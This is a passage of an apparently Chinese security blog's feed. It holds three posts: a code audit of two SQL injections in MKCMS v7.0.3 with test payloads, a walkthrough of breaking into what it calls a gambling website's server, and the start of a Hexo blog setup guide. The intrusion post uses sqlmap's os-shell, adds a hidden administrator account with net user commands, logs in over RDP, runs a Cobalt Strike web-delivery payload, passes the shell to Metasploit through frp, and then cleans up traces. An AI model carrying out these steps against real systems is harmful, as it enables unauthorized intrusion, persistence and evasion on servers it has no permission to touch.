&#123;margin: 30px 15px 0 auto;&#125;</span><br><span class="line">@media (max-width: 768px)&#123; #imgcon1&#123;display:none;&#125;&#125;</span><br><span class="line">#imgcon1 a&#123; display:block; width:48%;height:500px; position:absolute;z-index:999;&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;!--[if lt IE 9]&gt;    </span><br><span class="line">&lt;script src&#x3D;&quot;..&#x2F;style&#x2F;js&#x2F;html5shiv.js&quot;&gt;&lt;&#x2F;script&gt;   </span><br><span class="line">&lt;script src&#x3D;&quot;..&#x2F;style&#x2F;js&#x2F;respond.min.js&quot;&gt;&lt;&#x2F;script&gt;  </span><br><span class="line">&lt;![endif]--&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">function chk_form()&#123;</span><br><span class="line">var tel &#x3D; document.getElementById(&quot;tel&quot;);</span><br><span class="line">if(tel.value&#x3D;&#x3D;&quot;&quot;)&#123;</span><br><span class="line">alert(&quot;用户名不能为空！&quot;);</span><br><span class="line">return false;</span><br><span class="line">&#x2F;&#x2F;user.focus();</span><br><span class="line">&#125;</span><br><span class="line">var pass &#x3D; document.getElementById(&quot;pass&quot;);</span><br><span class="line">if(pass.value&#x3D;&#x3D;&quot;&quot;)&#123;</span><br><span class="line">alert(&quot;密码不能为空！&quot;);</span><br><span class="line">return false;</span><br><span class="line">&#x2F;&#x2F;pass.focus();</span><br><span class="line">&#125;</span><br><span class="line">var email &#x3D; document.getElementById(&quot;email&quot;);</span><br><span class="line">if(email.value&#x3D;&#x3D;&quot;&quot;)&#123;</span><br><span class="line">alert(&quot;Email不能为空！&quot;);</span><br><span class="line">return false;</span><br><span class="line">&#x2F;&#x2F;email.focus();</span><br><span class="line">&#125;</span><br><span class="line">var preg &#x3D; &#x2F;^\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*&#x2F;; &#x2F;&#x2F;匹配Email</span><br><span class="line">if(!preg.test(email.value))&#123; </span><br><span class="line">alert(&quot;Email格式错误！&quot;);</span><br><span class="line">return false;</span><br><span class="line">&#x2F;&#x2F;email.focus();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">&#x2F;*-------------------------------------------*&#x2F;</span><br><span class="line">var InterValObj; &#x2F;&#x2F;timer变量，控制时间</span><br><span class="line">var count &#x3D; 60; &#x2F;&#x2F;间隔函数，1秒执行</span><br><span class="line">var curCount;&#x2F;&#x2F;当前剩余秒数</span><br><span class="line">var code &#x3D; &quot;&quot;; &#x2F;&#x2F;验证码</span><br><span class="line">var codeLength &#x3D; 6;&#x2F;&#x2F;验证码长度</span><br><span class="line">function sendMessage() &#123;</span><br><span class="line">curCount &#x3D; count;</span><br><span class="line">var dealType; &#x2F;&#x2F;验证方式</span><br><span class="line">tel &#x3D; $(&#39;#tel&#39;).val();</span><br><span class="line">    if(tel!&#x3D;&#39;&#39;)&#123;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;验证手机有效性</span><br><span class="line"> var myreg &#x3D; &#x2F;^(((13[0-9]&#123;1&#125;)|(15[0-9]&#123;1&#125;)|(17[0-9]&#123;1&#125;)|(14[0-9]&#123;1&#125;)|(18[0-9]&#123;1&#125;))+\d&#123;8&#125;)$&#x2F;; </span><br><span class="line">            if(!myreg.test($(&#39;#tel&#39;).val())) </span><br><span class="line">          &#123; </span><br><span class="line">             alert(&#39;请输入有效的手机号码！&#39;); </span><br><span class="line">             return false; </span><br><span class="line">          &#125; </span><br><span class="line">tel &#x3D; $(&#39;#tel&#39;).val();</span><br><span class="line">   &#x2F;&#x2F;产生验证码</span><br><span class="line">for (var i &#x3D; 0; i &lt; codeLength; i++) &#123;</span><br><span class="line">code +&#x3D; parseInt(Math.random() * 9).toString();</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;设置button效果，开始计时</span><br><span class="line">$(&quot;#btnSendCode&quot;).attr(&quot;disabled&quot;, &quot;true&quot;);</span><br><span class="line">$(&quot;#btnSendCode&quot;).val(&quot;请在&quot; + curCount + &quot;秒内输入&quot;);</span><br><span class="line">InterValObj &#x3D; window.setInterval(SetRemainTime, 1000); &#x2F;&#x2F;启动计时器，1秒执行一次</span><br><span class="line">&#x2F;&#x2F;向后台发送处理数据</span><br><span class="line">                $.ajax(&#123;</span><br><span class="line">                    type: &quot;POST&quot;, &#x2F;&#x2F;用POST方式传输</span><br><span class="line">                    dataType: &quot;text&quot;, &#x2F;&#x2F;数据格式:JSON</span><br><span class="line">                    url: &#39;&#x2F;ucenter&#x2F;yanzhengma.php&#39;, &#x2F;&#x2F;目标地址</span><br><span class="line">                    data: &quot;&amp;tel&#x3D;&quot; + tel + &quot;&amp;code&#x3D;&quot; + code,</span><br><span class="line">                    error: function (XMLHttpRequest, textStatus, errorThrown) &#123; &#125;,</span><br><span class="line">                    success: function (msg)&#123; &#125;</span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line">        &#125;else&#123;</span><br><span class="line">alert(&#39;请填写手机号码&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">&#x2F;&#x2F;timer处理函数</span><br><span class="line">function SetRemainTime() &#123;</span><br><span class="line">if (curCount &#x3D;&#x3D; 0) &#123;                </span><br><span class="line">window.clearInterval(InterValObj);&#x2F;&#x2F;停止计时器</span><br><span class="line">$(&quot;#btnSendCode&quot;).removeAttr(&quot;disabled&quot;);&#x2F;&#x2F;启用按钮</span><br><span class="line">$(&quot;#btnSendCode&quot;).val(&quot;重新发送验证码&quot;);</span><br><span class="line">code &#x3D; &quot;&quot;; &#x2F;&#x2F;清除验证码。如果不清除，过时间后，输入收到的验证码依然有效    </span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">curCount--;</span><br><span class="line">$(&quot;#btnSendCode&quot;).val(&quot;请在&quot; + curCount + &quot;秒内输入&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body style&#x3D;&quot;padding-top: 60px;&quot;&gt;</span><br><span class="line">&lt;?php include(&#39;..&#x2F;template&#x2F;&#39;.$mkcms_bdyun.&#39;&#x2F;header.php&#39;);?&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;imgcon1&quot;&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;&lt;?php echo $link2;?&gt;&quot; target&#x3D;&quot;_blank&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;wrapper&quot; class&#x3D;&quot;pad-bottom p-imgcon&quot;&gt;</span><br><span class="line">   &lt;div id&#x3D;&quot;content-container&quot; class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;es-section login-section&quot;&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;logon-tab clearfix&quot;&gt;</span><br><span class="line">    &lt;a href&#x3D;&quot;login.php&quot;&gt;登录账号&lt;&#x2F;a&gt;</span><br><span class="line">    &lt;a class&#x3D;&quot;active&quot;&gt;注册账号&lt;&#x2F;a&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;login-main&quot;&gt;</span><br><span class="line">      &lt;form class&#x3D;&quot;form-horizontal js-ajax-form&quot;  method&#x3D;&quot;post&quot; onsubmit&#x3D;&quot;return chk_form();&quot;&gt;</span><br><span class="line">   &lt;label class&#x3D;&quot;control-label required&quot;&gt;账号&lt;&#x2F;label&gt;</span><br><span class="line">       &lt;div class&#x3D;&quot;control-group&quot; style&#x3D;&quot;margin-bottom:10px;&quot;&gt;</span><br><span class="line"> &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;name&quot; id&#x3D;&quot;tel&quot; placeholder&#x3D;&quot;作为登录账号使用&quot; value&#x3D;&quot;&quot; class&#x3D;&quot;form-control input-lg span4&quot;&gt;</span><br><span class="line">   &lt;&#x2F;div&gt;</span><br><span class="line">   &lt;label class&#x3D;&quot;control-label required&quot; &gt;邮箱&lt;&#x2F;label&gt;</span><br><span class="line">       &lt;div class&#x3D;&quot;control-group&quot; style&#x3D;&quot;margin-bottom:10px;&quot;&gt;</span><br><span class="line"> &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;email&quot; id&#x3D;&quot;email&quot; placeholder&#x3D;&quot;邮箱&quot; class&#x3D;&quot;form-control input-lg span4&quot;&gt;</span><br><span class="line">   &lt;&#x2F;div&gt;</span><br><span class="line">&lt;?php if($mkcms_smsname!&#x3D;&quot;&quot;)&#123;?&gt;</span><br><span class="line">&lt;label class&#x3D;&quot;control-label required&quot; &gt;手机验证码&lt;&#x2F;label&gt; </span><br><span class="line">&lt;div class&#x3D;&quot;control-group&quot; style&#x3D;&quot;margin-bottom:10px;&quot;&gt; </span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;txtsmscode&quot; id&#x3D;&quot;txtsmscode&quot; placeholder&#x3D;&quot;点击右侧获取&quot; class&#x3D;&quot;form-control input-lg span4&quot; style&#x3D;&quot;width:200px;float:left;margin-right:5px;&quot;&gt;</span><br><span class="line"> &lt;input id&#x3D;&quot;btnSendCode&quot; class&#x3D;&quot;form-control input-lg js-ajax-dialog-btn&quot; type&#x3D;&quot;button&quot; value&#x3D;&quot;获取验证码&quot; onclick&#x3D;&quot;sendMessage()&quot; style&#x3D;&quot;width:130px&quot; &#x2F;&gt; &lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php &#125;?&gt;   </span><br><span class="line">   &lt;label class&#x3D;&quot;control-label required&quot; &gt;密码&lt;&#x2F;label&gt;</span><br><span class="line">   &lt;div class&#x3D;&quot;control-group&quot; style&#x3D;&quot;margin-bottom:10px;&quot;&gt;</span><br><span class="line"> &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; id&#x3D;&quot;pass&quot; placeholder&#x3D;&quot;登陆密码,请牢记!&quot; class&#x3D;&quot;form-control input-lg span4&quot;&gt;</span><br><span class="line">   &lt;&#x2F;div&gt;</span><br><span class="line">  </span><br><span class="line">  &lt;div class&#x3D;&quot;control-group&quot;&gt;</span><br><span class="line">&lt;button class&#x3D;&quot;btn btn-primary js-ajax-submit btn-lg btn-block&quot; type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; data-wait&#x3D;&quot;1500&quot; style&#x3D;&quot;margin-left: 0px;margin-top:30px;width: 100%;&quot;&gt;确定注册&lt;&#x2F;button&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">     &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">   &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;div&gt; </span><br><span class="line">&lt;?php include(&#39;..&#x2F;template&#x2F;&#39;.$mkcms_bdyun.&#39;&#x2F;footer.php&#39;);?&gt; </span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure></li></ul><p>但是在第7行处，<code>$username</code>的值是来自于<code>POST</code>传递的<code>name</code>参数，当<code>name</code>参数到达<code>reg.php</code>这个文件之后，<code>stripslashes（）</code>函数将<code>name</code>的值进行了去除<code>“\”</code>处理，<br><img src="https://img-blog.csdnimg.cn/2020122409471580.png"></p><p>根据<code>include</code>，跳转到<code>/system/library.php</code>中，我们可以发现这里系统对<code>GET</code>、<code>POST</code>等参数进行了<code>addslashes_deep（）</code>函数处理，即对参数传递时加上了一个<code>“\”</code>，<br><img src="https://img-blog.csdnimg.cn/20201224094931786.png"></p><p>问题就出在这里，前端用户进行提交的<code>name</code>参数，经过了<code>addslashes_deep（）</code>函数处理加上了一个<code>“\”</code>，到达<code>reg.php</code>页面又使用<code>stripslashes（）</code>函数将<code>name</code>的值进行了去除<code>“\”</code>处理，这就导致出现了无过滤拼接。</p><h1 id="第二处注入"><a href="#第二处注入" class="headerlink" title="第二处注入"></a>第二处注入</h1><ul><li><p><strong>漏洞文件</strong><br><code>admin/model/admin_edit.php</code>（后台文件）</p></li><li><p><strong>分析</strong><br>在<code>admin_edit.php</code>文件第10行处，系统进行了数据库查询，拼接了两个参数，一个是<code>POST</code>传递的<code>a_name</code>，一个是<code>GET</code>传递的<code>id</code>，可以看出，系统并未对参数在这里做任何的过滤处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#39;save&#39;])) &#123;</span><br><span class="line">null_back($_POST[&#39;a_name&#39;], &#39;请填写登录账号&#39;);</span><br><span class="line">null_back($_POST[&#39;a_password&#39;], &#39;请填写登录密码&#39;);</span><br><span class="line">null_back($_POST[&#39;a_cpassword&#39;], &#39;请重复输入登录密码&#39;);</span><br><span class="line">if ($_POST[&#39;a_password&#39;] !&#x3D; $_POST[&#39;a_cpassword&#39;]) &#123;</span><br><span class="line">alert_back(&#39;两次输入的密码不一致&#39;);</span><br><span class="line">&#125;</span><br><span class="line">$result &#x3D; mysqli_query($conn,&#39;select * from mkcms_manager where m_name &#x3D; &quot;&#39; . $_POST[&#39;a_name&#39;] . &#39;&quot; and m_id &lt;&gt; &#39; . $_GET[&#39;id&#39;] . &#39;&#39;);</span><br><span class="line">if (mysqli_fetch_array($result)) &#123;</span><br><span class="line">alert_back(&#39;登录账号重复，请更换登录账号。&#39;);</span><br><span class="line">&#125;</span><br><span class="line">$_data[&#39;m_name&#39;] &#x3D; $_POST[&#39;a_name&#39;];</span><br><span class="line">$_data[&#39;m_password&#39;] &#x3D; md5($_POST[&#39;a_password&#39;]);</span><br><span class="line">$sql &#x3D; &#39;update mkcms_manager set &#39; . arrtoupdate($_data) . &#39; where m_id &#x3D; &#39; . $_GET[&#39;id&#39;] . &#39;&#39;;</span><br><span class="line">if (mysqli_query($conn,$sql)) &#123;</span><br><span class="line">alert_href(&#39;管理员修改成功!&#39;, &#39;cms_admin.php&#39;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">alert_back(&#39;修改失败!&#39;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201224095407687.png"></p></li></ul><h1 id="本地复现"><a href="#本地复现" class="headerlink" title="本地复现"></a>本地复现</h1><ul><li><p><strong>环境搭建</strong><br>由于需要设置伪静态，这里用的是宝塔面板<br>源码地址：<a href="https://pan.baidu.com/s/1ejCjLSVQEa1tFINVTPqfyA">米酷CMS v7.0.3</a>，提取码：uy5u<br>（环境搭建教程在源码中附有）<br>搭建完成：<br>后台账号密码为<code>admin/admin</code><br><img src="https://img-blog.csdnimg.cn/20201224095929466.png"></p></li><li><p><strong>第一处漏洞测试</strong><br>来到前台漏洞点，<code>http://mkcms.com/ucenter/reg.php</code>（<em>mkcms.com为本地静态!</em>)<br>抓包注册<code>admin</code>用户，提示已存在<br><img src="https://img-blog.csdnimg.cn/20201224100359818.png"></p></li></ul><p>在<code>name</code>参数处构造<strong>Payload</strong>：<code>+and+&#39;1&#39;=&#39;2</code><br><img src="https://img-blog.csdnimg.cn/20201224100515100.png"></p><p>在<code>name</code>参数处构造<strong>Payload</strong>：<code>+and+&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/20201224100537442.png"></p><p>根据不同的返回值可以说明构造的payload被拼接到数据库进行了判断处理.<br>使用sqlmap验证<br><img src="https://img-blog.csdnimg.cn/20201224100655923.png"></p><ul><li><strong>第二处漏洞测试</strong><br>定位到漏洞点，url：<code>http://mkcms.com/admin/cms_admin_edit.php?id=1</code>（<em>mkcms.com为本地静态!</em>)<br><img src="https://img-blog.csdnimg.cn/20201224100835165.png"></li></ul><p>使用单引号进行判断<br><img src="https://img-blog.csdnimg.cn/20201224100855576.png"></p><p>构造<strong>payload：</strong><code>id=1+and+if(1&gt;2,1,sleep(3))</code><br><img src="https://img-blog.csdnimg.cn/20201224100919889.png"></p><p>可以看到，数据库执行了<code>sleep（）</code>函数</p><p>直接丢到sqlmap进行注入<br><img src="https://img-blog.csdnimg.cn/20201224101017956.png"></p><p>至此，米酷cms v7.0.3漏洞复现结束<br>这篇文章是一次非常简单的代码审计以及复现过程<br>初触代码审计，大佬多多指教</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞简介&quot;&gt;&lt;a href=&quot;#漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;漏洞简介&quot;&gt;&lt;/a&gt;漏洞简介&lt;/h1&gt;&lt;p&gt;米酷影视管理系统是一套专为不同需求的站长而设计的影视管理系统，灵活，方便，人性化设计简单易用是最大的特色，是快速架设视频网站</summary>
      
    
    
    
    <category term="代码审计" scheme="https://shuaiqiyu.github.io/Categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="php" scheme="https://shuaiqiyu.github.io/tags/php/"/>
    
    <category term="代码审计" scheme="https://shuaiqiyu.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>利用CS4.0和FRP拿下“打牌”网站服务器</title>
    <link href="https://shuaiqiyu.github.io/2021/03/24/%E5%88%A9%E7%94%A8CS4-0%E5%92%8CFRP%E6%8B%BF%E4%B8%8B%E2%80%9C%E6%89%93%E7%89%8C%E2%80%9D%E7%BD%91%E7%AB%99%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>https://shuaiqiyu.github.io/2021/03/24/%E5%88%A9%E7%94%A8CS4-0%E5%92%8CFRP%E6%8B%BF%E4%B8%8B%E2%80%9C%E6%89%93%E7%89%8C%E2%80%9D%E7%BD%91%E7%AB%99%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
    <published>2021-03-24T01:28:15.000Z</published>
    <updated>2021-03-24T02:06:03.671Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境的部署"><a href="#环境的部署" class="headerlink" title="环境的部署"></a>环境的部署</h1><h2 id="CS4-0服务器部署"><a href="#CS4-0服务器部署" class="headerlink" title="CS4.0服务器部署"></a>CS4.0服务器部署</h2><p>这里用的是阿里云服务器，也可以部署在本地<br>首先上传cs4.0压缩包到服务器，执行解压<br><img src="https://img-blog.csdnimg.cn/20201025215554824.png"></p><p>执行命令<code>./teamserver ip passwd</code>开启服务器<br><img src="https://img-blog.csdnimg.cn/2020102522024347.png"></p><p>完成之后我们打开本地CS4.0连接服务器，Host就写服务器IP，密码也是之前写的<br><img src="https://img-blog.csdnimg.cn/20201025220937947.png"></p><p>成功连接<br><img src="https://img-blog.csdnimg.cn/20201025221044778.png"></p><h3 id="踩坑点"><a href="#踩坑点" class="headerlink" title="踩坑点"></a>踩坑点</h3><ul><li>服务器的端口一定要设置开启</li><li>修改teamserver的权限为777</li></ul><h2 id="frp部署"><a href="#frp部署" class="headerlink" title="frp部署"></a>frp部署</h2><p>同样先把安装包上传到服务器端和客户端然后解压<br>服务器端将frps权限改为777，同时修改<code>frps.ini</code>文件，设置端口。<br><img src="https://img-blog.csdnimg.cn/20201025221625797.png"><br><code>vim frps.ini</code><br><img src="https://img-blog.csdnimg.cn/20201025221819288.png"></p><p><code>frps -c frps.ini</code>开启服务<br><img src="https://img-blog.csdnimg.cn/20201025222124827.png"></p><p>kali端其他同理</p><p><code>vim frpc.ini</code><br><code>server_addr</code>就是服务器IP，端口就是之前设置的端口<br><code>local_ip</code>回环就行，端口随便设置不常用的，后面要用到<br><img src="https://img-blog.csdnimg.cn/20201025222451608.png"></p><p><code>./frpc -c frpc.ini</code>开启服务<br><img src="https://img-blog.csdnimg.cn/20201025222949751.png"><br><strong>如果不想多开终端可以使用nohup+重定向</strong></p><h1 id="开始打牌"><a href="#开始打牌" class="headerlink" title="开始打牌"></a>开始打牌</h1><p>找到后台页面抓个包<br><img src="https://img-blog.csdnimg.cn/2020102522384918.png"><br><img src="https://img-blog.csdnimg.cn/2020102601235223.png"></p><p>因为之前已经测处来了存在注入，所以直接丢尽sqlmap一把梭哈<br>最终成功拿到数据库<br><img src="https://img-blog.csdnimg.cn/2020102522581933.png"></p><p>这里找了一下终于在<code>RYPlatforManagerDB</code>里面找到了账户信息<br>密码是加密的，用自带的解密工具得出了顶级弱口令<code>admin-admin</code><br><img src="https://img-blog.csdnimg.cn/20201025225401113.png"></p><p>成功进入后台<br><img src="https://img-blog.csdnimg.cn/20201025230747403.png"></p><p>乱点一通，没发现啥啥比较容易利用的，重新回到sqlmap<br>用<code>–is-dba</code>参数判断得出当前用户为<code>DBA</code><br><img src="https://img-blog.csdnimg.cn/20201025225708589.png"><br>接下来就使用<code>–os-shell</code>参数试试能不能拿到shell，经过漫长等待最终成功了<br><img src="https://img-blog.csdnimg.cn/2020102523090257.png"></p><p><code>whoami</code>发现令人惊喜一幕<br><img src="https://img-blog.csdnimg.cn/20201025231230880.png"></p><p>这还能说啥，直接上命令了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user <span class="built_in">test</span> QWer1234! /add</span><br><span class="line">net localgroup administrators <span class="built_in">test</span> /add</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20201025232109649.png"><br><img src="https://img-blog.csdnimg.cn/20201025232133471.png"></p><p>接下来就尝试一波RDP连接，不出意外失败了<br><img src="https://img-blog.csdnimg.cn/20201025232528213.png"></p><p>思考了一下原因，决定从RDP这个服务本身开始进行排错<br>首先确认一下RDP这个服务是不是开着的，不管了直接用<code>net start termservice</code>的命令，反正最终也要打开这个服务<br><img src="https://img-blog.csdnimg.cn/20201025233556130.png"></p><p>服务是开着的，那么可能性就多了，这时最怕遇到的就是管理员开了白名单，那就白忙活一场<br>既然都到这了肯定不能放弃，就先从最简单的点进行排错<br>由于sqlmap的回显是出奇的慢，得想个办法，在得到想要的结果的同时尽可能去缩减回显的内容，这样就可以加快回显的速度，提高效率。<br>经过一番百度，终得出这样的思路：既然服务开启，那么就会有对应的进程，RDP的服务对应的进程名称是svchost.exe,描述是termservice，那么可以查看带有termservice描述的svchost.exe进程去拿到进程PID，然后通过PID去获取服务的端口号，同时加上管道符|还能减少回显内容<br>尝试之后得到以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc | findstr termservice</span><br><span class="line">netstat -ano | findstr 进程号</span><br></pre></td></tr></table></figure><p>这里出了点问题，回显竟然没有任何内容<br>！<a href="https://img-blog.csdnimg.cn/20201025234526177.png"></a></p><p>理论上来说，肯定是有回显才对。<br>经过一番挣扎，发现忽略了一个细节！不能用<code>termservice</code>而是要用<code>TermService</code>，竟然忘记区分大小写了！<br>重新来过，成功拿到了进程<code>PID 1908</code><br><img src="https://img-blog.csdnimg.cn/20201025235104348.png"><br>有了PID，就可以反查端口<br><img src="https://img-blog.csdnimg.cn/20201026000934800.png"></p><p>还好，管理员只是改了端口，并没有开启白名单，有了端口就可以用之前创建的账号进行连接了</p><p>最终是成功拿到了服务器<br><img src="https://img-blog.csdnimg.cn/20201026001638370.png"><br><code>systeminfo</code>查看一下信息,补丁挺多<br><img src="https://img-blog.csdnimg.cn/2020102600150330.png"></p><h1 id="还没有结束"><a href="#还没有结束" class="headerlink" title="还没有结束"></a>还没有结束</h1><p>本着不浪费的原则，还是cs上线一波，不然就白白浪费调试cs服务器的时间了<br>用cs客户端先建立<code>listener</code><br><img src="https://img-blog.csdnimg.cn/20201026002200210.png"></p><p>然后选择<code>Attacks-&gt;Web Drive-by-&gt;Scripted Web Delivery(s)</code>,host就写服务器地址，端口随便写，<code>listener</code>就选择刚刚创建的监听，可以得到一条让目标上线的<code>payload</code><br><img src="https://img-blog.csdnimg.cn/20201026002552584.png"></p><p>用os-shell去执行这个payload，过一会就能上线cs了<br><img src="https://img-blog.csdnimg.cn/20201026003330170.png"></p><p>成功上线~至于为啥会上线这么多个，我也还在思考中，<br><img src="https://img-blog.csdnimg.cn/20201026003510658.png"></p><p>右键目标，就可以使用很多种攻击方式了<br><img src="https://img-blog.csdnimg.cn/20201026003949220.png"></p><p>因为写这篇文章的时候特别菜，所以这是个裸的cs4.0，那么还是回到kali吧<br>用配置好的frp尝试把这个shell反弹到msf试试<br>这里需要在cs上重新建立一个新的listener<br><img src="https://img-blog.csdnimg.cn/20201026005000754.png"></p><p>然后进入<code>msfconsle</code>设置监听本地的1235端口<br><img src="https://img-blog.csdnimg.cn/20201026005552330.png"></p><p>到cs中<code>右键目标-&gt;spawn</code><br>选之前建立的msf监听器就行了<br><img src="https://img-blog.csdnimg.cn/20201026005656628.png"></p><p>不出意外的话，过十秒钟msf就能接受到服务器弹过来的shell，但是这里突然出现了一个状况，cs提示<code>beacon exit</code> , 之前sqlmap的<code>os-shell</code>也断了<br><img src="https://img-blog.csdnimg.cn/20201026005919657.png"><br><img src="https://img-blog.csdnimg.cn/20201026010125491.png"></p><p>我怀疑是管理员上线了，被迫放弃。看来是天意，那就到此为止<br>总结一下，收获还不错<br>RDP回去清理了一下战场，收工走人</p><p>雕虫小技，大佬多多指点~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;环境的部署&quot;&gt;&lt;a href=&quot;#环境的部署&quot; class=&quot;headerlink&quot; title=&quot;环境的部署&quot;&gt;&lt;/a&gt;环境的部署&lt;/h1&gt;&lt;h2 id=&quot;CS4-0服务器部署&quot;&gt;&lt;a href=&quot;#CS4-0服务器部署&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="Web渗透" scheme="https://shuaiqiyu.github.io/Categories/Web%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="cs4.0" scheme="https://shuaiqiyu.github.io/tags/cs4-0/"/>
    
    <category term="frp" scheme="https://shuaiqiyu.github.io/tags/frp/"/>
    
    <category term="web渗透" scheme="https://shuaiqiyu.github.io/tags/web%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Github+Hexo搭建个人博客--从零开始</title>
    <link href="https://shuaiqiyu.github.io/2021/03/22/Hexo%E7%9A%84%E6%90%AD%E5%BB%BA/"/>
    <id>https://shuaiqiyu.github.io/2021/03/22/Hexo%E7%9A%84%E6%90%AD%E5%BB%BA/</id>
    <published>2021-03-22T06:49:53.000Z</published>
    <updated>2021-03-24T01:22:30.967Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Hexo简介"><a href="#Hexo简介" class="headerlink" title="Hexo简介"></a>Hexo简介</h2><p>一直想搭建一个属于自己的博客，在市面上的各种blog框架中挑来挑去，最终选择了Hexo。<br>Hexo是一款基于Node.js的静态博客框架，依赖少易于安装使用，可以方便的生成静态网页托管在GitHub和Coding上，是搭建博客的首选框架。大家可以进入<a href="https://hexo.io/">Hexo</a>官网进行详细查看，因为Hexo的创建者是台湾人，对中文的支持很友好，可以选择中文进行查看。</p><h2 id="Hexo搭建步骤"><a href="#Hexo搭建步骤" class="headerlink" title="Hexo搭建步骤"></a>Hexo搭建步骤</h2><p>因为我没有一点前端基础，所以在搭建的过程中基本都是参考网上的教程，期间也踩了很多坑，最终也是成功部署了Hexo<br>Hexo的整部署流程包括以下几点：<br>1.安装Git<br>2.安装Node.js<br>3.安装Hexo<br>4.将Hexo部署到GitHub<br>5.Hexo的一些常见配置说明</p><h3 id="1-安装Git"><a href="#1-安装Git" class="headerlink" title="1.安装Git"></a>1.安装Git</h3><p>Git是目前世界上最先进的分布式版本控制系统，可以有效、高速的处理从很小到非常大的项目版本管理。也就是用来管理你的hexo博客文章，上传到GitHub的工具。<br>Windows：到git官网上下载,<a href="https://gitforwindows.org/">点击这里</a>，下载后会有一个Git Bash的命令行工具，以后就用这个工具来使用git。<br>Linux:用一句命令就可以在Linux中安装Git</p><figure class="highlight bash"><figcaption><span>install git</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git</span><br></pre></td></tr></table></figure><p>使用命令<code>git --version</code>可以查看版本<br><img src="https://img.imgdb.cn/item/605843b98322e6675c73bef6.png"></p><h3 id="2-安装Node-js"><a href="#2-安装Node-js" class="headerlink" title="2.安装Node.js"></a>2.安装Node.js</h3><p>Hexo是基于nodeJS编写的，所以需要安装一下nodeJs和里面的npm工具。<br>Windows： <a href="https://nodejs.org/en/download/">点我下载</a><br>Linux：</p><figure class="highlight bash"><figcaption><span>install nodejs</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nodejs</span><br><span class="line">sudo apt-get install npm</span><br></pre></td></tr></table></figure><p>安装完成之后，使用命令<code>node -v</code>,<code>npm -v</code>来检查是否成功安装<br><img 